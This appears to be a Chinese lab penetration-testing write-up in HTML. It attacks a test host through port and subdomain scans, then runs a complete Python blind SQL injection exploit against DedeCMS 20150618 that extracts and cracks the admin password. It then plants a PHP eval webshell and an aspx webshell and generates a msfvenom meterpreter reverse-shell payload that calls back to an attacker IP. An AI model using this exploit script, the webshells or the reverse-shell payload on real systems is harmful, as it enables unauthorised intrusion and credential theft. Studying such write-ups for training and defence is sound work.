+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.20.19.png" alt="截屏2022-05-25 00.20.19"></p>
+<p>成功访问目标站点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.35.56.png" alt="截屏2022-05-25 00.35.56"></p>
+<h2 id="0x02-外网边界突破"><a href="#0x02-外网边界突破" class="headerlink" title="0x02 外网边界突破"></a>0x02 外网边界突破</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用 masscan 快速扫描目标全部端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.0.134 --rate=200</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.05.07.png" alt="截屏2022-05-25 00.05.07"></p>
+<p>在使用 masscan 进行扫描时需要注意扫描速率，速率太快很可能导致端口扫描情况不准确，比如我之前分别使用 500 以及 1000 的速率进行扫描均未得到完整的端口信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.26.06.png" alt="截屏2022-05-25 00.26.06"></p>
+<p>使用 nmap 对 masscan 扫描到的端口进行具体的信息探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sC -p 21,53,80,135,999,3389,6588,49154,49155 192.168.0.134</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.39.30.png" alt="截屏2022-05-25 00.39.30"></p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问域名后界面为科讯CMS，站点采用的中间件为 IIS 7<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.35.56.png" alt="截屏2022-05-25 00.35.56"></p>
+<h4 id="999端口"><a href="#999端口" class="headerlink" title="999端口"></a>999端口</h4><p>访问后界面为数据库管理工具 PHPMyAdmin<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.44.07.png" alt="截屏2022-05-25 00.44.07"></p>
+<h4 id="6588端口"><a href="#6588端口" class="headerlink" title="6588端口"></a>6588端口</h4><p>访问后界面为护卫神主机大师的登录界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2000.45.28.png" alt="截屏2022-05-25 00.45.28"></p>
+<h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><p>在端口探测时目标开放了53端口，说明存在域名解析服务，因此我们可以将该主机作为域名解析服务器来解析<code>cc123.com</code>，从而探测它的子域名。尝试修改 DNS 解析服务器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置</span></span></span><br><span class="line">nameserver 192.168.0.134</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.18.02.png" alt="截屏2022-05-25 03.18.02"></p>
+<p>与此同时在服务器上添加 DNS 域名解析<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%20%E4%B8%8A%E5%8D%883.03.47.png" alt="截屏2022-05-25 上午3.03.47"></p>
+<p>使用 wfuzz 进行子域名枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.23.37.png" alt="截屏2022-05-25 03.23.37"><br>成功发现目标存在如下子域名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.cc123.com</span><br><span class="line">new.cc123.com</span><br><span class="line">ww2.cc123.com</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>new</code>子域名，界面显示为织梦CMS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.26.39.png" alt="截屏2022-05-25 03.26.39"></p>
+<p>访问<code>ww2</code>子域名，界面显示为一家名为亿成的市政服务公司官网<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.27.48.png" alt="截屏2022-05-25 03.27.48"></p>
+<h2 id="0x03-new子域渗透"><a href="#0x03-new子域渗透" class="headerlink" title="0x03 new子域渗透"></a>0x03 new子域渗透</h2><h3 id="DedeCMS前台SQL注入"><a href="#DedeCMS前台SQL注入" class="headerlink" title="DedeCMS前台SQL注入"></a>DedeCMS前台SQL注入</h3><p>由于<code>new</code>子域名对应的是 DEDECMS，默认后台登录路径为<code>/dede</code>，尝试使用弱口令登录无果<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.34.29.png" alt="截屏2022-05-25 03.34.29"></p>
+<p>默认前台登录路径为<code>/member</code>，尝试弱口令也是无果<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.36.37.png" alt="截屏2022-05-25 03.36.37"></p>
+<p>在注册界面中注册用户<code>mac/mac</code>，同时完善用户信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.37.15.png" alt="截屏2022-05-25 03.37.15"></p>
+<p>进入个人用户中心<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.37.37.png" alt="截屏2022-05-25 03.37.37"></p>
+<p>访问路径<code>/data/admin/ver.txt</code>发现当前 DEDECMS 的版本为20150618，可能存在SQL注入漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.40.55.png" alt="截屏2022-05-25 03.40.55"><br>在此之前我们需要收集用户的 Cookie，首先复制请求头<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.55.00.png" alt="截屏2022-05-25 03.55.00"></p>
+<p>筛选 Cookie 并将其放入<code>cookies.txt</code>当中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2003.55.47.png" alt="截屏2022-05-25 03.55.47"></p>
+<p>源代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">opener = urllib2.build_opener()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCookes</span>():</span></span><br><span class="line">    line = <span class="built_in">open</span>(<span class="string">&#x27;cookies.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    c = line.readline()</span><br><span class="line">    line.close()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">cookie=getCookes()</span><br><span class="line">opener.addheaders.append((<span class="string">&#x27;Cookie&#x27;</span>,cookie))</span><br><span class="line">payloads = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789@_.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploite</span>(<span class="params">target</span>):</span></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line">            s1 = <span class="string">&quot;%s&quot;</span> %(i)</span><br><span class="line">            s2 = <span class="string">&quot;%s&quot;</span> %(<span class="built_in">ord</span>(p))</span><br><span class="line">            s = target+<span class="string">&quot;/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][a&#x27;%20and%20`&#x27;`.``.mtypeid%20or%20if(ascii(substr((select%20pwd%20from%20dede_admin%20limit%201),&quot;</span>+s1+<span class="string">&quot;,1))%3d&quot;</span>+s2+<span class="string">&quot;,sleep(4),0)%20and%20mtypeid%3d1%23]=w&amp;_FILES[mtypename][size]=.xxxx&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = urllib2.Request(s)</span><br><span class="line">                req_data=opener.<span class="built_in">open</span>(req,timeout=<span class="number">20</span>)</span><br><span class="line">                now = time.strftime(<span class="string">&#x27;%H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">4.0</span>:</span><br><span class="line">                    password = password+p</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;[&quot;</span>+<span class="built_in">str</span>(now)+<span class="string">&quot;]: &quot;</span>+s1+<span class="string">&quot; -&gt; &quot;</span>+password</span><br><span class="line">            <span class="keyword">except</span> urllib2.URLError,e:</span><br><span class="line">                <span class="built_in">print</span> e;</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myhelp</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n+------------------------------+&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;|  Dedecms 20150618 member sqli|&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;|  mOon  www.moonsec.com       |&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;|  MTEAM:moon@moonsec.com      |&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;+------------------------------+\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt; <span class="number">2</span>:</span><br><span class="line">        myhelp()</span><br><span class="line">        sys.exit()</span><br><span class="line">    now = time.strftime(<span class="string">&#x27;%H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[&quot;</span>+<span class="built_in">str</span>(now)+<span class="string">&quot;] [INFO] Dedecms 20150618 member sqli..&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;password is %s&quot;</span> % (exploite(sys.argv[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>使用脚本进行扫描SQL注入漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://new.cc123.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.26.23.png" alt="截屏2022-05-25 23.26.23"><br>当然直接扫描是无法进行注入，我们需要在分类管理中添加一个分类<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.27.46.png" alt="截屏2022-05-25 23.27.46"></p>
+<p>操作完成后再次扫描，虽然能够成功注入，但是注入明显还是有点问题<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.35.03.png" alt="截屏2022-05-25 23.35.03"></p>
+<p>于是我们换 Windows 进行测试，完成域名解析以及 Python 安装后再次扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py http://new.cc123.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%20%E4%B8%8B%E5%8D%8811.40.07.png" alt="截屏2022-05-25 下午11.40.07"></p>
+<p>成功拿到密文为<code>812df726be884ddcfc41</code>，在解密网站中成功解密为<code>admin7788</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.41.49.png" alt="截屏2022-05-25 23.41.49"></p>
+<h3 id="DedeCMS后台上传木马"><a href="#DedeCMS后台上传木马" class="headerlink" title="DedeCMS后台上传木马"></a>DedeCMS后台上传木马</h3><p>使用<code>admin/admin7788</code>成功登录网站后台<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.44.54.png" alt="截屏2022-05-25 23.44.54"></p>
+<p>找到文件管理员并向其中上传一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mac&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-25%2023.46.51.png" alt="截屏2022-05-25 23.46.51"></p>
+<p>使用蚁剑成功连接木马，木马地址为<code>http://new.cc123.com/uploads/mac.php</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2000.03.13.png" alt="截屏2022-05-26 00.03.13"></p>
+<h3 id="MS16-075烂土豆内核提权"><a href="#MS16-075烂土豆内核提权" class="headerlink" title="MS16-075烂土豆内核提权"></a>MS16-075烂土豆内核提权</h3><p>尝试在蚁剑中执行命令，但是命令执行失败<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2000.09.15.png" alt="截屏2022-05-26 00.09.15"></p>
+<p>说明当前权限较低，与此同时发现 ASP.NET 目录，那么上传 aspx 是否能解析呢？<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2002.33.51.png" alt="截屏2022-05-26 02.33.51"></p>
+<p>上传 aspx 木马<code>AspxSpy2014Final.aspx</code>并访问发现成功解析，输入密码<code>admin</code>进入大马<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.23.23.png" alt="截屏2022-05-26 03.23.23"></p>
+<p>尝试执行命令，命令执行发现当前权限比 php 小马的权限高<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-05-26%2003.24.40.png" alt="截屏2022-05-26 03.24.40"></p>
+<p>但是当前权限仍然不足，我们可使用 msf 进行提权，说先生成 msf 木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.114 lport=7777 -f exe &gt; mac.exe</span><br></pre></td></tr></table></figure>
